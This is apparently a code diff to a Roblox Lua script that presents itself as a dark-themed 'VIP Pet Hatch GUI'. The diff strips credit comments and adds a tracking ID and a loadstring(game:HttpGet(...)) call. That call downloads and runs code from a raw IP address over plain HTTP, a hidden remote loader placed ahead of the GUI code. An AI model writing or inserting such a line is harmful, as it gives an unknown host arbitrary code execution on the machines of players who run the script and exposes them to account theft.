@@ -1,7 +1,6 @@
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
+ID="edd073e0-949e-44ff-b831-437675610f63";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
 
 -- ⛏ BIudnyHoIandan VIP Pet Hatch GUI (Dark Theme with White Buttons)
 local Players = game:GetService("Players")
